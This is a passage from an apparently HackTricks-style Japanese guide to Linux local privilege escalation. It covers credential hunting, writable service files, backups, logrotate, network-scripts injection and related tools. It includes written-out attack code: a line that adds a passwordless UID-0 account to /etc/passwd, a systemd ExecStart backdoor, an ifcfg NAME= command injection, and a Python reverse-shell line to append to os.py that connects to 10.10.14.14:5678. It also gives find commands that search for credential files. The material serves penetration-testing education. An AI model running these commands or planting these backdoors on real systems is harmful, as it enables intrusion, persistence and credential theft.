echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注: BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密ファイルに書き込めるか**確認してください。たとえば、**サービス設定ファイル**に書き込めますか？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

たとえば、マシンで**tomcat**サーバーが稼働していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます。

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

次回 tomcat が起動したときに、backdoor が実行されます。

### フォルダを確認

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります。**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダはおそらく読み取れませんが、試してみてください）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 不審な場所／所有ファイル

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 直近数分間に変更されたファイル

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DBファイル

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

読み取り可能なアプリケーションデータベースでは、ユーザー名やパスワードハッシュが含まれるテーブル名とカラム名を確認します。ハッシュの発見、そのパスワードの復元、ローカルアカウントでの再利用の確認は、それぞれ別の手順です。汎用的な32文字の16進数文字列だけでは、MD5やアカウントへのアクセス権があるとは判断できません。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

読み取り可能な shell history に `sudo` コマンドと、その後に短いパスワードのような行が含まれている場合は、前後の行を手動で確認してください。通常の `sudo` プロンプトに入力したパスワードは shell history に保存されません。後続の行は、誤って shell に入力された可能性があるだけで、有効なパスワードの証拠ではありません。`.sudo_as_admin_successful` マーカーは過去の使用を記録するものであり、現在の認可状態を示すものではありません。

### 隠しファイル

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 内のスクリプト/バイナリ**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webファイル**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **バックアップ**

バックアップディレクトリ内の読み取り可能なファイルに加え、**名前**に `backup` を含むファイルも調べましょう。不透明な名前や暗号化拡張子のアーカイブでも、古いアプリケーションデータが漏れている可能性があります。暗号化されたアーカイブは、露出している可能性がある対象にすぎません。パスワードの復旧、内容の確認、アプリケーションのハッシュの復旧、そのパスワードを Unix アカウントで再利用できるかの確認は、それぞれ別の手順です。アーカイブ内のハッシュだけでは、ローカルログインが可能だとは判断できません。

読み取り可能な仮想マシンのバックアップも同様に確認しましょう。VirtualBox の `.vbox` 設定ファイルから、接続されている `.vdi` イメージを特定でき、暗号化ディスクキーのメタデータが含まれている場合もあります。[VirtualBox のドキュメントによると、暗号化データキーは VM の設定ファイルに保存されます](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。オフラインでディスクを確認するには、設定ファイルとイメージの両方にアクセスできる必要があります。ゲストボリュームには独自の[LUKS 暗号化レイヤー](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)があり、別のキーが必要な場合があります。許可を得て復号した後でも、古いスクリプトや設定ファイルにパスワードが含まれている可能性があります。これをローカルでの権限昇格と判断する前に、その認証情報がホストアカウントで現在も有効であることと、そのアカウントの実効 `sudo` ポリシーで特権コマンドを実行できることを確認しましょう。パッシブな列挙中は、イメージをコピー、復号、マウントせず、パスと権限だけを調べてください。

読み取り可能なアーカイブを調べる際は、展開する前にメンバー名を一覧表示しましょう。稼働中の環境にあるコピーが保護されていても、隠された認証ファイル、リカバリーコードのデータ、SSH キーが含まれている可能性があります。ファイル名は手がかりにすぎません。内容と、アカウントで再利用されているかどうかは別途確認してください。

バックアップディレクトリ内にある、**別のユーザーが所有する読み取り可能なアーカイブ**を優先して調べましょう。特に root が所有するアーカイブや、グループメンバーシップを通じてアクセス可能なものが対象です。稼働中のコピーが保護されていても、古いアーカイブに設定情報や認証シークレットが含まれている場合があります。[Backrest](https://garethgeorge.github.io/backrest/) のようなローカルバックアップ UI では、サービスの実効アカウントと、低い権限のユーザーがその設定を読めるか、または UI に認証できるかを確認しましょう。その [hooks](https://garethgeorge.github.io/backrest/docs/hooks) と [restic コマンドインターフェース](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto)は、デーモンのファイル権限とコマンド実行権限で動作します。ループバックリスナーであることだけでは、影響は判断できません。Backrest の `passwordBcrypt` は、[認証コード](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)内の base64 エンコードされた bcrypt ハッシュであり、平文パスワードではありません。露出したアーカイブや UI を権限境界の問題とみなす前に、サービスの実行ユーザー、有効な認証情報、および該当するプランやリポジトリへのアクセスを確認してください。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。**パスワードを含む可能性のある複数のファイル**を検索します。\
そのために使える**もう1つの興味深いツール**は、[**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。Windows、Linux、Macのローカルコンピューターに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

`/etc/guacamole/guacamole.properties` を読み取れる場合は、`mysql-*`、`postgresql-*`、`sqlserver-*` のデータベース接続設定を確認してください。アカウントに Guacamole JDBC テーブルを読み取る権限がある場合、`guacamole_connection_parameter` に保存済みの SSH `username`、`password`、`private-key`、`passphrase` の値が含まれている可能性があります。まず接続 ID とパラメーター名を確認し、関連する行だけを調べてください。保存された値は、再利用可能なシークレットではなく、動的トークンや vault への参照である可能性があります。[Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) と [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) を参照してください。

[pswm password manager](https://github.com/Julynx/pswm#usage) は、デフォルトで暗号化された vault を `~/.local/share/pswm/pswm` に保存します。他のユーザーの vault が見える場合は、その所有者と、自分のアカウントが実際に読み取れるかどうかを確認してください。vault のパスだけでは認証情報は分かりません。master password の復元、再利用可能なアカウントパスワードの発見、そのアカウントの権限の確認は、それぞれ別の手順です。

[Passpie のデフォルトデータベース](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) は `~/.passpie/` で、`.keys` keyring と、グループディレクトリ内の暗号化された `.pass` 認証情報ファイルで構成されます。データベースディレクトリが見えるだけでは、パスが分かったにすぎません。キーと関連する暗号化エントリにアクセスできること、必要な master passphrase があること、復元した認証情報がより高い権限を持つアカウントのものかどうかを確認してください。Passpie は[カスタムデータベースパス](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)にも対応しているため、デフォルトパスですべてを網羅できるわけではありません。自動列挙では、認証情報をエクスポートしたりキーの内容を表示したりせず、メタデータのみを列挙してください。

### ログ

ログを読める場合、**ログ内に興味深い情報や機密情報**が見つかることがあります。ログが奇妙であるほど、興味深い内容が含まれている可能性が高くなります（おそらく）。\
また、設定に問題のある（バックドアが仕込まれた？）**audit logs** の中には、この記事で説明されているように、**パスワードを記録できる**ものもあります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

**ログを読むには、[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) グループが非常に役立ちます。**

### シェルファイル

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 汎用的な認証情報検索/正規表現

ファイル名またはファイルの内容に「**password**」という単語が含まれているファイルを探し、ログ内の IP アドレスやメールアドレス、ハッシュの正規表現も確認してください。\
ここではその方法をすべて列挙しませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python ライブラリの乗っ取り

Python スクリプトが**どこで**実行されるか分かっていて、そのフォルダーに**書き込み可能**、または Python ライブラリを**変更可能**な場合は、OS ライブラリを変更して backdoor を仕込めます（Python スクリプトの実行場所に書き込み可能なら、os.py ライブラリをコピーして貼り付けてください）。

**ライブラリに backdoor を仕込む**には、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更してください）：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Logrotate の悪用

特権ユーザーで実行される `logrotate` ジョブは、ローテーション時に低権限ユーザーが置き換えたりリダイレクトしたりできるディレクトリ内のログを実際にローテーションする場合、ユーザー間のファイル書き込み経路を作り出すことがあります。ログが書き込み可能というだけでは、調査の手掛かりにすぎません。実際に有効なルールと、その `create`、`olddir`、`su` ディレクティブ、スケジューラーの実効ユーザー、ログの親ディレクトリに対する書き込み権限と検索権限、インストール済みビルドとポリシーが保存先の変更を許可するかを確認してください。さらに、スタートアップファイルへの書き込みをコマンド実行につなげるには、その結果できたファイルを後続の特権シェルが読み込む必要があります。ローテーションを実行したり、競合を試みたりせずに、スケジュール、ルール、バージョンとパッケージング、パスのメタデータを調査してください。

> [!TIP]
> `3.18.0` やバージョン文字列だけを悪用可能性の境界とみなさないでください。[Upstream の変更履歴](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)には、複数のリリースにわたるディレクトリとシンボリックリンクの強化が記載されており、ディストリビューションが修正をバックポートしている場合もあります。[Upstream のマニュアル](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)では、非特権ユーザーが管理するディレクトリ内のログを root がローテーションする場合、`su` を使うことを推奨しています。有効なルールと実際の動作を確認してください。

この脆弱性の詳細は、こちらのページをご覧ください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx のログ)** と非常によく似ています。そのため、ログを変更できると分かった場合は、ログを管理しているユーザーを確認し、ログをシンボリックリンクに置き換えて権限昇格できるか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照先:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

低権限ユーザーが `ifcfg-*` ファイルを作成または変更でき、かつ特権で実行されるネットワーク有効化処理がそのファイルを実際に読み込む場合、そのファイルは調査の手掛かりになります。実際に使われるファイルとディレクトリの権限、選択されたインターフェース、インストール済みの `ifup`/`ifdown` の実装、そしてそれらを実行するユーザーを確認してください。ファイルが書き込み可能というだけでは、コードは実行されません。[Red Hat の RHEL 7 ネットワークガイド](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)では、従来のネットワークスクリプトと NetworkManager を区別しています。後者が前者を起動することはありません。[RHEL 8 のドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)によると、デフォルトの `ifup`/`ifdown` は NetworkManager を使用し、オプションの従来型パッケージがシェルスクリプトを提供します。

特権で実行される従来型スクリプトを実際に使用しているシステムでは、`NAME=` のような、引用符で囲まれずシェルに読み込まれる `ifcfg-*` の代入文が、コード実行境界を越える可能性があります。ファイル名や NetworkManager の存在からシェルによる解釈を推測せず、正確なパーサー、値、有効化経路を確認してください。呼び出し元の入力を `ifcfg-*` ファイルに書き込み、その後に従来型の `ifup` を呼び出すことを sudo で許可されたラッパーは、呼び出し元がファイルを直接編集できない場合でも、この境界に至る別の経路となります。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

（Network と /bin/id の間に空白があることに注意）

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、System V init（SysVinit）の**スクリプト**が格納されています。SysVinit は**従来の Linux サービス管理システム**です。サービスの `start`、`stop`、`restart`、場合によっては `reload` を行うスクリプトが含まれています。これらは直接実行することも、`/etc/rc?.d/` にあるシンボリックリンク経由で実行することもできます。Redhat 系システムでは、`/etc/rc.d/init.d` という別のパスが使われます。

一方、`/etc/init` は Ubuntu が導入した新しい**サービス管理システム**である **Upstart** に関連し、サービス管理タスク用の設定ファイルを使用します。Upstart への移行後も、Upstart の互換レイヤーにより、SysVinit スクリプトは Upstart の設定と併用されています。

**systemd** は、オンデマンドでのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を備えた、最新の初期化・サービス管理システムです。ディストリビューションのパッケージ用に `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` を使用してファイルを整理し、システム管理を効率化します。<sup>[[21]](#references)</sup>

## その他のテクニック

### NFS による権限昇格


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 制限付き Shell からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は、一般に syscall をフックして、userspace の manager に特権カーネル機能を公開します。manager の認証が弱い場合（例: FD の順序に基づく署名チェックや脆弱なパスワード方式）、ローカルアプリが manager になりすまし、root 化済みデバイスで root 権限を取得できる可能性があります。詳しい解説と exploit の詳細はこちら:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex ベースのサービス検出では、プロセスのコマンドラインからバイナリのパスを抽出し、特権コンテキストで `-v` を付けて実行する場合があります。許容範囲の広いパターン（例: `\S` の使用）は、書き込み可能な場所に攻撃者が配置した listener（例: `/tmp/httpd`）にも一致する可能性があり、root としての実行につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

詳しい解説と、他の検出・監視スタックにも適用できる一般的なパターンはこちら:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc ツール

### **Linux のローカル権限昇格につながる要素を探す最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t オプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel の脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプト集**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning（Crontab UI の権限昇格、zip -P の認証情報再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron で実行される monitor 用の偽造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch のバイパス（sudo env_keep PATH の乗っ取り）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux の基本的な権限昇格](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 権限昇格ガイド](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻撃と防御: 2016 年の Linux 権限昇格テクニック](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰も command execution を予想していない！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux 権限昇格)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux 権限昇格のヒントとテクニック](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux の列挙・権限昇格ツール](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) の writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS を使う](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables による Linux 権限昇格](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo パート 2 – Linux 権限昇格](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACL を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts を使った Redhat/CentOS の root 権限取得](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（ログを介した bash 算術式インジェクション、全体の攻撃チェーン）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（非対話型 startup file）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink による権限昇格）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 名前を付ければ、VMware が昇格させる（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot による権限昇格](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 および CVE-2025-32463 Sudo の権限昇格脆弱性](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib ドキュメント](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec による Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux でのパスワード記録](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate の race condition の詳細](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
